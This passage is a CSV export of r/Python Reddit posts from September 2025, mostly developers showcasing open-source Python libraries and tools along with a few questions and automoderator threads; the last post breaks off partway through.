1nh3rlv,I was terrible at studying so I made a Chrome extension that forces you to learn programming.,MaxDev0,160,22,2025-09-14 21:40:42,https://www.reddit.com/r/Python/comments/1nh3rlv/i_was_terrible_at_studying_so_i_made_a_chrome/,"tldr; I made a free, open-source Chrome extension that helps you study by showing you flashcards while you browse the web. Its algorithm uses spaced repetition and semantic analysis to target your weaknesses and help you learn faster. It started as an SAT tool, but I've expanded it for everything, and I have custom flashcard deck suggestions for you guys to learn programming syntax and complex CS topics.

Hi everyone,

So, I'm not great at studying, or any good lol. Like when the SATs were coming up in high school, all my friends were getting 1500s, and I was just not, like I couldn't keep up, and I hated that I couldn't just sit down and study like them. The only thing I did all day was browse the web and working on coding projects that i would never finish in the first place.

So, one day, whilst working on a project and contemplating how bad of a person I was for not studying, I decided why not use my only skill, coding, to force me to study.

At first I wanted to make like a locker that would prevent my from accessing apps until I answered a question, but I only ever open a few apps a day, but what I did do was load hundreds of websites a da, and that's how the idea flashysurf was born. I didn't even have a real computer at the time, my laptop broke, so I built the first version as a userscript on my old iPad with a cheap Bluetooth mouse. It basically works like this, it's a Chrome extension that just randomly pops up with a flashcard every now and then while you're on YouTube, watching Anime, GitHub, or wherever. You answer it, and you slowly build knowledge without even trying.

It's completely free and open source ([GitHub link here](https://github.com/MaxDevv/FlashySurf)), and I got a little obsessed with the algorithm  (I've been working on this for like 5-6 months now lol). It's not just random. It uses a combination of psycological techniques to make learning as efficient as possible:

* Dumb Weakness Targeting: Really simple, everytime you get a question wrong, its stored in a list and then later on these quesitons are priorotized that way you work on your weaknesses.
* Intelligent Weakness Targeting: This was one of the biggest updates I made. For my SAT version, I implemented a semantic clustering system that groups questions by topic. So for example, if you get a question about arithmentic wrong, it knows to show you more questions that are semantically similar. Meaning it actively tarkedts your weak areas. The question selection is split 50% new questions, 35% questions similar to ones you've failed, and 15% direct review of failed questions.
* Forced Note-Taking: This is in my opinion the most important feature in flashysurf for learning. Basically, if you get a question wrong, you have to write a short note on why you messed up and what you should've done instead, before you can close the card. It forces you to actually assess your mistakes and learn from them, instead of just clicking past them.

At first, it was just for the SAT, and the results were actually really impressive. I personally got my score up 100 points, which is like going from the top 8% to the top 3% (considered a really big improvement), and a lot of my friends and other online users saw 60-100 point increases. So it proved the concept worked, especially for lazy people like me who want to learn without the effort of a formal study session.

After seeing it work so well, I pushed an update, FlashySurf v2.0, so that anyone can study LITERALLY ANYTHING without having to try. You can create and import your own flashcard decks for any subject.

The only/biggest caveat about flashysurf is that you need to use it for a bit of time to see results like I used it for 2 months to see that 100 point increase (technically that was an outdated version with far less optimizations, so it should take less time) so you can't just use it for a test you have tmrw (unless you set it to be like 100% which would mean that a flashcard would appear on every single website).

It has a few more features that I couldn't mention here: AI flashcard generation from documents; 30 minute breaks to focus; stats on flashcard collections; and for the SAT, performance reports. (Also if ur wondering why i'm using semicolons, I actually learnt that from studying the SAT using flashysurf lol)

And for you guys in r/python, I thought this would be perfect for drilling concepts that just need repetition. So, if you go to the flashysurf [flashcard creator](https://flashysurf.com/creator) you can actually use the AI flashcard import/maker tool to convert any documents (i.e. programming problems/exercises you have) or your own flashcard decks into flashysurf flashcards. So you can work on complex programming topics like Big O notation, dynamic programming, and graph theory algorithms. Note: You will obviously need the extension to use the cards lol but when you install the extension, you'll recieve [instructions](https://flashysurf.com/onboarding) on creating and importing flashcards, so you don't gotta memorize any of this.

You can download it from the Chrome Web Store, link in the website: [https://flashysurf.com/](https://flashysurf.com/?utm_source=rpst&utm_campaign=rpython)

I'm still actively working on it (just pushed a bugfix yesterday lol), so I'd love to hear any feedback or ideas you have. Hope it helps you learn something new while you're procrastinating on your actual work.

Thanks for reading :D

Complicance thingy

# What My Project Does

FlashySurf is a free, open-source Chrome extension that helps users learn and study by showing them flashcards as they browse the web. It uses a spaced repetition algorithm with semantic analysis to identify and target a user's weaknesses. The extension also has features like a ""Forced Note-Taking"" system to ensure users learn from their mistakes, and it allows for custom flashcard decks so it can be used for any subject.

# Target Audience

FlashySurf is intended for anyone who wants to learn or study new information without the effort of a formal study session. It is particularly useful for students, professionals, or hobbyists who spend a lot of time on the web and want to use that time more productively. It's a production-ready project that's been in development for over six months, with a focus on being a long-term learning tool.

# Comparison

While there are other flashcard and spaced repetition tools, FlashySurf stands out by integrating learning directly into a user's everyday browsing habits. Unlike traditional apps like Anki, which require dedicated study sessions, FlashySurf brings the flashcards to you. Its unique combination of a spaced repetition algorithm with a semantic clustering system means it not only reinforces what you've learned but actively focuses on related topics where you are weakest. This approach is designed to help ""lazy"" learners like me who struggle with traditional study methods."
1nh1lj2,Python Interview Questions: From Basics to Advanced,Numerous-Trust7439,0,3,2025-09-14 20:14:28,https://www.reddit.com/r/Python/comments/1nh1lj2/python_interview_questions_from_basics_to_advanced/,"The article titled ""Python Interview Questions: From Basics to Advanced"" [Python Interview Questions: From Basics to Advanced](https://www.lockedinai.com/blog/python-interview-questions-from-basics-to-advanced) provides a comprehensive guide to help candidates prepare for Python-related interviews across various levels. It covers essential topics ranging from fundamental syntax to advanced concepts.

* Basic Concepts: The article emphasizes the importance of understanding Python's syntax, data types, variables, and control structures. It discusses common pitfalls such as mutable default arguments and floating-point precision issues.
* Intermediate Topics: It delves into data structures like sets, dictionaries, and deques, as well as object-oriented programming concepts like inheritance and encapsulation.
* Advanced Topics: The article explores advanced subjects including decorators, generators, and concurrency mechanisms like threading, multiprocessing, and asyncio.
* Preparation Tools: It highlights resources like mock interviews, real-time feedback, and personalized coaching to aid in effective preparation.

This guide serves as a valuable resource for individuals aiming to enhance their Python skills and perform confidently in interviews."
1ngy2ha,Another free Python 3 book - Files and Directories,caudor,19,8,2025-09-14 17:57:43,https://www.reddit.com/r/Python/comments/1ngy2ha/another_free_python_3_book_files_and_directories/,"If you are interested, you can click the top link on my landing page and download my eBook, ""Working with Files and Directories in Python 3"" for free: [https://tr.ee/MFl4Mmyu1B](https://tr.ee/MFl4Mmyu1B)

I recently gave away a Beginner's Python Book and that went really well

So I hope this 26 page pdf will be useful for someone interested in working with Files and Directories  in Python. Since it is sometimes difficult to copy/paste from a pdf, I've added a .docx and .md version as well. The link will download all 3 as a zip file. No donations will be requested. Only info needed is a name and email address to get the download link.  It doesn't matter to me if you put a fake name.  Enjoy."
1ngcnn7,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,17,18,2025-09-14 00:00:35,https://www.reddit.com/r/Python/comments/1ngcnn7/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1ng9en6,midi-visualiser: A real-time MIDI player and visualiser.,Ben2508,13,8,2025-09-13 21:34:14,https://www.reddit.com/r/Python/comments/1ng9en6/midivisualiser_a_realtime_midi_player_and/,"Hi all, I recently revisited an old project I created to visualise MIDI music (using a piano roll) and after some tidying up and fixes I've now uploaded it to¬†[PyPI](https://pypi.org/project/midi-visualiser/)! The program allows single MIDI files or playlists of MIDI files to be loaded and visualised through a command-line tool.

It's fairly simple, using Pygame to display the visualiser window and provide playback control, but I'm pretty proud of how it looks and the audio-syncing logic (which uses Mido to interpret MIDI events). More details on how to use it are available in the¬†[project repository](https://github.com/benjaminrall/midi-visualiser).

This is the first project I've used¬†[uv](https://docs.astral.sh/uv/)¬†for, and I absolutely love it - check it out if you haven't already. Also, any suggestions/comments about the project would be greatly appreciated as I'm very new to uploading to PyPI!

To summarise;
- **What My Project Does**: Plays MIDI files and visualises them using a scrolling piano roll
- **Target Audience**: Mainly just a toy project, but could be used by anyone who wants a simple & quick way to view any MIDI file!
- **Comparison**: I can't find any alternatives that have this same functionality (at least not made in Python) - it obviously can't compete with mega fancy MIDI visualisers, but a strong point is how straight forward the project is, working immediately from the command-line without needing any configuration.

Edit: Thanks to a comment, I've discovered an issue that means this only works on Windows - will look into fixing this, sorry!"
1ng926f,What is the best way of developing an Agent in Python to support a Go backend?,bhushokali,0,5,2025-09-13 21:18:46,https://www.reddit.com/r/Python/comments/1ng926f/what_is_the_best_way_of_developing_an_agent_in/,"Giving the context here: me a novice in Agentic world however have strong Go and Python dev background.
Having said that, I am quite confused with not sure how to develop agents for the backend.
Open to discussion and guidance."
1ng8qg0,Tea Tasting: t-testing library alternatives?,rm-rf-rm,1,4,2025-09-13 21:04:40,https://www.reddit.com/r/Python/comments/1ng8qg0/tea_tasting_ttesting_library_alternatives/,"I dont feel this repo is Pythonic nor are their docs sufficient: [https://e10v.me/tea-tasting-analysis-of-experiments/](https://e10v.me/tea-tasting-analysis-of-experiments/) (am i missing something or stupid?) 

Looking for good alternatives - I havent found any "
1ng65fg,Gute Ideen gesucht!,Certain_Bar712,0,0,2025-09-13 19:15:41,https://www.reddit.com/r/Python/comments/1ng65fg/gute_ideen_gesucht/,Ich baue gerade eine UI mit CTk (Custom Tkinter) ‚Äì eure Ideen kommen direkt ins Design! Die 2 beliebtesten Vorschl√§ge werden umgesetzt. Jetzt mitmachen auf https://reddit.com/r/CraftandProgramm! 
1ng2h8x,SplitterMR: a modular library for splitting & parsing documents,Andreshere,19,0,2025-09-13 16:52:42,https://www.reddit.com/r/Python/comments/1ng2h8x/splittermr_a_modular_library_for_splitting/,"Hey guys, I just released **SplitterMR**, a library I built because none of the existing tools quite did what I wanted for slicing up documents cleanly for LLMs / downstream processing.

If you often work with **mixed document types** (PDFs, Word, Excel, Markdown, images, etc.) and **need flexible, reliable splitting/parsing**, this might be useful.

This library supports **multiple input formats**, e.g., text, Markdown, PDF, Word / Excel / PowerPoint, HTML / XML, JSON / YAML, CSV / TSV, and even images.

Files can be read using **MarkItDown** or **Docling**, so this is perfect if you are using those frameworks with your current applications.

Logically, it supports **many different splitting strategies**: not only based on the number of characters but on tokens, schema keys, semantic similarity, and many other techniques. You can even develop your own splitter using the Base object, and it is the same for the Readers!

In addition, **you can process the graphical resources of your documents (e.g., photos) using VLMs** (OpenAI, Gemini, HuggingFace, etc.), so you can extract the text or caption them!

# What‚Äôs new / what‚Äôs good in the latest release

* Stable Version **1.0.0** is out.
* Supports **more input formats / more robust readers**.
* **Stable API** for the Reader abstractions so you can plug in your own if needed.
* **Better handling of edge cases** (e.g. images, schema‚Äôd JSON / XML) so you don‚Äôt lose structure unintentionally.

# Some trade-offs / limitations (so you don‚Äôt run into surprises)

* **Heavy dependencies**: because it supports all these formats you‚Äôll pull in a bunch of libs (PDF, Word, image parsing, etc.). If you only care about plain text, many of those won‚Äôt matter, but still.
* **Not a fully ‚ÄúLLM prompt manager‚Äù or embedding chunker out of the box** ‚Äî splitting + parsing is its job; downstream you‚Äôll still need to decide chunk sizes, context windows, etc.

# Installation and usage

If you want to test:

    uv add splitter-mr

Example usage:

    from splitter_mr.reader import VanillaReader
    from splitter_mr.model.models import AzureOpenAIVisionModel
    
    model = AzureOpenAIVisionModel()
    reader = VanillaReader(model=model)
    output = reader.read(file_path=""data/sample_pdf.pdf"")
    print(output.text)

**Check out the docs for more examples, API details, and instructions on how to write your own Reader for special formats:**  

* üëâ [Github](https://github.com/andreshere00/Splitter_MR)
* üëâ [Documentation server](https://andreshere00.github.io/Splitter_MR/)
* üëâ [PyPi package](https://pypi.org/project/splitter-mr/1.0.1/)
* üëâ [LinkedIn (to contact with me)](https://www.linkedin.com/in/andres-herencia)

If you want to collaborate or you have some suggestions, don't dubt to contact me.

**Thank you so much for reading :)**
"
1ng10wr,The best object notation?,StarsRonin,39,128,2025-09-13 15:54:47,https://www.reddit.com/r/Python/comments/1ng10wr/the_best_object_notation/,"I want your advice regarding the best object notation to use for a python project. If you had the choice to receive data with a specific object notation, what would it be? YAML or JSON? Or another object notation?

YAML looks, to me, to be in agreement with a more pythonic way, because it is simple, faster and easier to understand. On the other hand, JSON has a similar structure to the python dictionary and the native python parser is very much faster than the YAML parser.

Any preferences or experiences?"
1nfyq8o,MathFlow: an easy-to-use math library for python,sciencenerd_1943,116,28,2025-09-13 14:21:43,https://www.reddit.com/r/Python/comments/1nfyq8o/mathflow_an_easytouse_math_library_for_python/,"Project Site: [https://github.com/cybergeek1943/MathFlow](https://github.com/cybergeek1943/MathFlow)

In the process of doing research for my paper [Combinatorial and Gaussian Foundations of Rational Nth Root Approximations](https://doi.org/10.48550/arXiv.2508.14095) (on arXiv), I created this library to address the pain points I felt when using only SymPy and SciPy separately. I wanted something lightweight, easy to use (exploratory), and something that would support numerical methods more easily. Hence, I created this lightweight wrapper that provides a hybrid symbolic-numerical interface to symbolic and numerical backends. It is backward compatible with Sympy. In short, this enables much faster analysis of symbolic math expressions by providing both numerical and traditional symbolic methods of analysis in the same interface. I have also added additional numerical methods that neither SymPy nor SciPy have (Pade approximations, numerical roots, etc.). The main goal for this project is to provide a tool that requires as little of a learning curve as possible and allows them to just focus on the math they are doing.

# Core features

* **üîí Operative Closure**: Mathematical operations return new Expression objects by default
* **‚ö° Mutability Control**: Choose between immutable (default) and mutable expressions for different workflows
* **üîó Seamless Numerical Integration**: Every symbolic expression has a¬†`.n`¬†attribute providing numerical methods without manual lambdification (uses cached lambdified expression when needed)
* **üé® Enhanced Printing**: Flexible output formatting through the¬†`.print`¬†attribute (LaTeX, pretty printing, code generation)
* **üì° Signal System**: Qt-like signals for tracking expression mutations and clones, enabling reactive programming
* **üîÑ Automatic Type Conversions**: Seamlessly and automatically converts between internal Poly and Expr representations based on context
* **üì¶ Lightweight**: \~0.5 MB itself, \~100 MB including dependencies
* **üß© Fully backward compatible**: Seamlessly integrate SymPy and MathFlow in the same script. All methods that work on SymPy Expr or Poly objects work on MathFlow objects
* **üîç Exploratory**: Full IDE support, enabling easy tool finding and minimizing the learning curve.

A few examples are shown below. Many more examples can be found in the README of the official GitHub site.

# Quick Start

Install using: `pip install mathflow`

    from mathflow import Expression, Polynomial, Rational
    
    # Create expressions naturally
    f = Expression(""2x^2 + 3x + \frac{1}{2}"")  # latex is automatically parsed
    g = Expression(""sin(x) + cos(x)"")
    
    # Automatic operative closure - operations return new objects of the same type
    h = f + g  # f and g remain unchanged
    hprime = h.diff()  # hprime is still an Expression object
    
    # Numerical evaluation made easy
    result = f(2.5)  # Numerically evaluate at x = 2.5
    
    # Use the .n attribute to access fast numerical methods
    numerical_roots = f.n.all_roots()
    # Call f's n-prefixed methods to use variable precision numerical methods
    precise_roots = f.nsolve_all(prec=50)  # 50 digits of accuracy
    
    # quick and easy printing
    f.print()
    f.print('latex')  # LaTeX output
    f.print('mathematica_code')
    f.print('ccode')  # c code output

# Numerical Computing

MathFlow excels at bridging symbolic and numerical mathematics:

    f = Expression(""x^3 - 2x^2 + x - 1"")
    
    # Root finding
    all_roots = f.n.all_roots(bounds=(-5, 5))
    specific_root = f.nsolve_all(bounds=(-5, 5), prec=50)  # High-precision solve
    
    # Numerical calculus
    derivative_func = f.n.derivative_lambda(df_order=2)  # 2nd derivative numerical function  
    integral_result = f.n.integrate(-1, 1)               # Definite integral  
    
    # Optimization
    minimum = f.n.minimize(bounds=[(-2, 2)])

# Edit:

This project was developed and used primarily for a research project, so a thorough test suite has not yet been developed. The project is still in development, and the current release is an alpha version. I have tried to minimize danger here, however, by designing it as a proxy to the already well-tested SymPy and SciPy libraries."
1nfvo8y,Announcing iceoryx2 v0.7: Fast and Robust Inter-Process Communication (IPC) Library,elfenpiff,20,6,2025-09-13 11:59:15,https://www.reddit.com/r/Python/comments/1nfvo8y/announcing_iceoryx2_v07_fast_and_robust/,"Hello hello,

I am one of the maintainers of the open-source zero-copy middleware iceoryx2, and we‚Äôve just released iceoryx2 v0.7 which comes with Python language bindings. That means you can now use fast zero-copy communication directly in Python. Here is the full release blog: [https://ekxide.io/blog/iceoryx2-0-7-release/](https://ekxide.io/blog/iceoryx2-0-7-release/)

With iceoryx2 you can communicate between different processes, send data with publish-subscribe, build more complex request-response streams, or orchestrate processes using the event messaging pattern with notifiers and listeners.

We‚Äôve prepared a set of Python examples here: [https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/python](https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/python)

On top of that, we invested some time into writing a detailed getting started guide in the iceoryx2 book: [https://ekxide.github.io/iceoryx2-book/main/getting-started/quickstart.html](https://ekxide.github.io/iceoryx2-book/main/getting-started/quickstart.html)

And one more thing: iceoryx2 lets Python talk directly to C, C++ and Rust processes - without any serialization or binding overhead. Check out the cross-language publish-subscribe example to see it in action: [https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples](https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples)

So in short:

* **What My Project Does:** Zero-Copy Inter-Process Communication
* **Target Audience:** Developers building distributed systems, plugin-based applications, or safety-critical and certifiable systems
* **Comparision:** Provides a high-level, service-oriented abstraction over low-level shared memory system calls"
1nfupw4,I built QRPorter ‚Äî local Wi-Fi file transfer via QR (PC ‚Üî Mobile),MrShortCircuitMan,5,2,2025-09-13 11:05:08,https://www.reddit.com/r/Python/comments/1nfupw4/i_built_qrporter_local_wifi_file_transfer_via_qr/,"Hi everyone, I built **QRPorter**, a small open-source utility that moves files between desktop and mobile over your LAN/Wi-Fi using QR codes. No cloud, no mobile app, no accounts ‚Äî just scan & transfer.

# What it does

* **PC ‚Üí Mobile file transfer:** select a file on your desktop, generate a QR code, scan with your phone and download the file in the phone browser.
* **Mobile ‚Üí PC file transfer:** scan the QR on the PC, open the link on your phone, upload a file from the phone and it‚Äôs saved on the PC.

# Target audience

* Developers, students, and office users who frequently move screenshots, small media or documents between phone ‚Üî PC.
* Privacy-conscious users who want transfers to stay on their LAN/Wi-Fi (no third-party servers).
* Anyone who wants a dead-simple cross-device transfer without installing mobile apps.

# Comparison

* **No extra mobile apps / accounts** ‚Äî works via the phone‚Äôs browser and the desktop app.
* **Local-first** ‚Äî traffic stays on your Wi-Fi/LAN (no cloud).
* **Cross-platform** ‚Äî desktop UI + web interface works with modern mobile browsers (Windows / macOS / Linux / iOS / Android).

# Requirements & tested platforms

* **Python 3.12+** and `pip`.
* Tested on **Windows 11** and **Linux**; macOS should work.
* Key Python deps: `Flask`, `PySide6`, `qrcode`, `Werkzeug`, `Pillow`.

# Installation

You can install from PyPI:

    pip install qrporter

After install, run:

    qrporter

# Troubleshooting

* Make sure **both devices are on the same Wi-Fi/LAN** (guest/isolated networks often block local traffic).
* **Maximum 1 GB file size** limit and commonly used file types allowed.
* **One file at a time.** For multiple files, zip them and transfer the zip.

# License

* MIT License

# GitHub

[https://github.com/manikandancode/qrporter](https://github.com/manikandancode/qrporter)

I beautified and commented the code using AI to improve readability and inline documentation. If you try it out ‚Äî I‚Äôd love feedback, issues, or ideas for improvements. Thanks! üôè"
1nfphsi,Every Python Built-In Function Explained,Fabri10000,0,3,2025-09-13 05:40:42,https://www.reddit.com/r/Python/comments/1nfphsi/every_python_builtin_function_explained/,"Hi there, I just wanted to know more about Python and I had this crazy idea about knowing every built-in function from this language. Hope you learn sth new. Any feedback is welcomed. The source has the intention of sharing learning.

[Here's the explanation](https://www.youtube.com/watch?v=frsH10EgZ58)"
1nfiys8,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,4,0,2025-09-13 00:00:31,https://www.reddit.com/r/Python/comments/1nfiys8/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1nff4dw,"Flowfile - An open-source visual ETL tool, now with a Pydantic-based node designer.",Proof_Difficulty_434,45,16,2025-09-12 21:15:28,https://www.reddit.com/r/Python/comments/1nff4dw/flowfile_an_opensource_visual_etl_tool_now_with_a/,"Hey r/Python,

I built Flowfile, an open-source tool for creating data pipelines both visually and in code. Here's the latest feature: Custom Node Designer.

# What My Project Does

Flowfile creates bidirectional conversion between visual ETL workflows and Python code. You can build pipelines visually and export to Python, or write Python and visualize it. The Custom Node Designer lets you define new visual nodes using Python classes with Pydantic for settings and Polars for data processing.

# Target Audience

Production-ready tool for data engineers who work with ETL pipelines. Also useful for prototyping and teams that need both visual and code representations of their workflows.

# Comparison

* **Alteryx**: Proprietary, expensive. Flowfile is open-source.
* **Apache NiFi**: Java-based, requires infrastructure. Flowfile is pip-installable Python.
* **Prefect/Dagster**: Orchestration-focused. Flowfile focuses on visual pipeline building.

# Custom Node Example

    import polars as pl
    from flowfile_core.flowfile.node_designer import (
        CustomNodeBase, NodeSettings, Section,
        ColumnSelector, MultiSelect, Types
    )
    
    class TextCleanerSettings(NodeSettings):
        cleaning_options: Section = Section(
            title=""Cleaning Options"",
            text_column=ColumnSelector(label=""Column to Clean"", data_types=Types.String),
            operations=MultiSelect(
                label=""Cleaning Operations"",
                options=[""lowercase"", ""remove_punctuation"", ""trim""],
                default=[""lowercase"", ""trim""]
            )
        )
    
    class TextCleanerNode(CustomNodeBase):
        node_name: str = ""Text Cleaner""
        settings_schema: TextCleanerSettings = TextCleanerSettings()
    
        def process(self, input_df: pl.LazyFrame) -> pl.LazyFrame:
            text_col = self.settings_schema.cleaning_options.text_column.value
            operations = self.settings_schema.cleaning_options.operations.value
            
            expr = pl.col(text_col)
            if ""lowercase"" in operations:
                expr = expr.str.to_lowercase()
            if ""trim"" in operations:
                expr = expr.str.strip_chars()
            
            return input_df.with_columns(expr.alias(f""{text_col}_cleaned""))

Save in `~/.flowfile/user_defined_nodes/` and it appears in the visual editor.

# Why This Matters

You can wrap complex tasks‚ÄîAPI connections, custom validations, niche library functions‚Äîinto simple drag-and-drop blocks. Build your own high-level tool palette right inside the app. It's all built on Polars for speed and completely open-source.

# Installation

`pip install Flowfile`

# Links

* GitHub: [https://github.com/Edwardvaneechoud/Flowfile/](https://github.com/Edwardvaneechoud/Flowfile/)
* Custom Nodes Documentation: [https://edwardvaneechoud.github.io/Flowfile/for-developers/creating-custom-nodes.html](https://edwardvaneechoud.github.io/Flowfile/for-developers/creating-custom-nodes.html)
* Previous discussions: [SideProject post](https://www.reddit.com/r/SideProject/comments/1mp0hor/i_built_a_tool_that_turns_python_data_pipelines/), [FlowFrame post](https://www.reddit.com/r/Python/comments/1kp0er9/flowframe_python_code_that_generates_visual_etl/)"
1nff0xi,withoutbg: open-source Python package for background removal (runs locally),Naive_Artist5196,1,1,2025-09-12 21:11:33,https://www.reddit.com/r/Python/comments/1nff0xi/withoutbg_opensource_python_package_for/,"**What My Project Does**  
[withoutbg](https://github.com/withoutbg/withoutbg) is a Python package for automatic background removal. It runs locally, so no data needs to be uploaded to a server. The package can also be used through an API if preferred.

**Target Audience**

* Developers building image editing applications
* Small business owners who want lightweight local tools
* Technologists looking for a free, open-source alternative to SaaS background removers
* Anyone who needs background removal but cares about **privacy** (images never leave your machine)

**Comparison**  
The closest alternative is **rembg**, which wraps models released with academic research. Many of those models are designed for salient object detection rather than true image matting, so they often fail in more complex scenes. withoutbg was trained with a custom dataset (partly purchased, partly produced) and is the result of running 300+ experiments to improve robustness.

**Technical details**

* Uses Depth-Anything v2 small as an upstream model, followed by a matting model and a refiner
* Implemented in PyTorch, converted to ONNX for deployment
* Dataset sample: [withoutbg100](https://withoutbg.com/resources/withoutbg100-image-matting-dataset)
* Dataset methodology: [creating alpha matting data](https://withoutbg.com/resources/creating-alpha-matting-dataset)

**Next steps**  
Docker image, serverless (AWS Lambda + S3), and a GIMP plugin.

Feedback on packaging, API design, or additional Python integrations would be very welcome."
1nfe1uq,I Used Python and Bayes to Build a Smart Cybersecurity System,kaolay,0,12,2025-09-12 20:33:40,https://www.reddit.com/r/Python/comments/1nfe1uq/i_used_python_and_bayes_to_build_a_smart/,"I've been working on an experimental project that combines Python, Bayesian statistics, and psychology to address cybersecurity vulnerabilities - and I'd appreciate your feedback on this approach.

# What My Project Does

The Cybersecurity Psychology Framework (CPF) is an open-source tool that uses Bayesian networks to predict organizational security vulnerabilities by analyzing psychological patterns rather than technical flaws. It identifies pre-cognitive vulnerabilities across 10 categories (authority bias, time pressure, cognitive overload, etc.) and calculates breach probability using Python's pgmpy library.

The system processes aggregated, anonymized data from various sources (email metadata, ticket systems, access logs) to generate risk scores without individual profiling. It outputs a dashboard with vulnerability assessments and convergence risk probabilities.

**Key features:**

* Privacy-preserving aggregation (no individual tracking)
* Bayesian probability modeling for risk convergence
* Real-time organizational vulnerability assessment
* Psychological intervention recommendations

**GitHub:**¬†[https://github.com/xbeat/CPF/tree/main/src](https://github.com/xbeat/CPF/tree/main/src)

# Target Audience

This is primarily a¬†**research prototype**¬†aimed at:

* Security researchers exploring human factors in cybersecurity
* Data scientists interested in behavioral analytics
* Organizations willing to pilot experimental security approaches
* Python developers interested in Bayesian applications

It's not yet production-ready but serves as a foundation for exploring psychological factors in security environments. The framework is designed for security teams looking to complement their technical controls with human behavior analysis.

# Comparison

Unlike traditional security tools that focus on technical vulnerabilities (firewalls, intrusion detection), CPF addresses the human element that causes 85% of breaches. While existing solutions like security awareness platforms focus on conscious training, CPF targets pre-cognitive processes that occur before conscious decision-making.

**Key differentiators:**

* Focuses on psychological patterns rather than technical signatures
* Uses Bayesian networks instead of rule-based systems
* Privacy-by-design (vs. individual monitoring solutions)
* Predictive rather than reactive approach
* Integrates psychoanalytic theory with data science

Most security tools tell you what happened; CPF attempts to predict what might happen based on psychological states.

# Current Status & Seeking Feedback

This is very much a work in progress. I'm particularly interested in:

* Feedback on the Bayesian network implementation
* Suggestions for additional data sources
* Ideas for privacy-preserving techniques
* Potential collaboration for pilot implementations

The code is experimental but functional, and I'd appreciate any technical or conceptual feedback from this community.

What aspects of this approach seem most promising? What concerns or limitations do you see?"
1nfdlmq,Learning machine learning,dedenorio,17,12,2025-09-12 20:15:48,https://www.reddit.com/r/Python/comments/1nfdlmq/learning_machine_learning/,"Is this an appropriate question here? 
I was wondering if anyone could suggest any resources to learn machine learning relatively quickly. By quickly I mean get a general understanding and be able to talk about it. Then I can spend time actually learning it. 
I‚Äôm a beginner in Python. Thanks!"
1nfdhlu,Thanks r/Python community for reviewing my project Ducky all in one networking tool!,initCMD,15,0,2025-09-12 20:11:27,https://www.reddit.com/r/Python/comments/1nfdhlu/thanks_rpython_community_for_reviewing_my_project/,"Thanks to this community I received some feedbacks about Ducky that I posted last week on here, I got 42 stars on github as well and some comments for Duckys enhancement. Im thankful for the people who viewed the post and went to see the source code huge thanks to you all.  

**What Ducky Does:**

Ducky is a desktop application that consolidates the essential tools of a network engineer or security enthusiast into a single, easy-to-use interface. Instead of juggling separate applications for terminal connections, network scanning, and diagnostics, Ducky provides a unified workspace to streamline your workflow. Its core features include a tabbed terminal (SSH, Telnet, Serial), an SNMP-powered network topology mapper, a port scanner, and a suite of security utilities like a CVE lookup and hash calculator.

**Target Audience:**

Ducky is built for anyone who works with network hardware and infrastructure. This includes:

* **Network Engineers & Administrators:**¬†For daily tasks like configuring switches and routers, troubleshooting connectivity, and documenting network layouts.
* **Cybersecurity Professionals:**¬†For reconnaissance tasks like network discovery, port scanning, and vulnerability research.
* **Students & Hobbyists:**¬†For those learning networking (e.g., for CompTIA Network+ or CCNA), Ducky provides a free, hands-on tool to explore and interact with real or virtual network devices.
* **IT Support & Help Desk:**¬†For frontline technicians who need to quickly run diagnostics like ping and traceroute to resolve user issues.

Github link [https://github.com/thecmdguy/Ducky](https://github.com/thecmdguy/Ducky)"
1nf79qg,What is 0 to the power of 0? (lim x‚Üí0‚Å∫ of x^x = 1),Ok-Lifeguard-9612,0,6,2025-09-12 16:07:21,https://www.reddit.com/r/Python/comments/1nf79qg/what_is_0_to_the_power_of_0_lim_x0_of_xx_1/,"I recently came across [this](https://www.youtube.com/watch?v=r0_mi8ngNnM) video from Eddie Woo, about ""**What is 0 to the power of 0?**""

And so I've made this one-line function `def f(x): return x**x`  and tried different inputs.  
I've noticed that you start getting 1 with this value: 0.000000000000000001

Why? Overflow, rounding, special corner case..."
1nf57hb,Update: Should I give away my app to my employer for free?,RDE_20,790,90,2025-09-12 14:47:00,https://www.reddit.com/r/Python/comments/1nf57hb/update_should_i_give_away_my_app_to_my_employer/,"Link to original post - https://www.reddit.com/r/Python/s/UMQsQi8lAX

Hi, since my post gained a lot of attention the other day and I had a lot of messages, questions on the thread etc. I thought I would give an update. 

I didn‚Äôt make it clear in my previous post but I developed this app in my own time, but using company resources. 

